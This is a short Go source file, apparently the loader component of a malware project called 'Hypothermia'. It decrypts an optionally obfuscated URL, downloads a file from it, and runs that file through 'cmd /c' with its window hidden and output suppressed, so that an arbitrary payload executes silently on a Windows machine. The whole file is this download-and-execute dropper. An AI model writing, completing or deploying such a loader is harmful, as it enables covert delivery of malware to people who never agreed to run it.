package main

import (
	"fmt"
	"os/exec"
	"regexp"
	"syscall"

	"Hypothermia/src/utils"
	"Hypothermia/src/utils/crypto"
)

var DOWNLOAD_URL string = ""

func main() {
	if isEncrypted(DOWNLOAD_URL) {
		DOWNLOAD_URL = utils_crypto.DecryptBasic(DOWNLOAD_URL)
	}

	path, err := utils.DonwloadFile(DOWNLOAD_URL)
	if err != nil {
		fmt.Println(err)
		return
	}

	cmd := exec.Command("cmd", "/c", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	cmd.Stderr = nil
	cmd.Stdout = nil
	cmd.Stdin = nil

	err = cmd.Run()
	if err != nil {
		fmt.Println("🟥 Failed to run")
		return
	}
}

func isEncrypted(data string) bool {
	if len(data) == 0 {
		return false
	}

	regex := regexp.MustCompile(`[a-zA-Z\.\-_]`)
	if regex.MatchString(data) {
		return false
	}

	return true
}
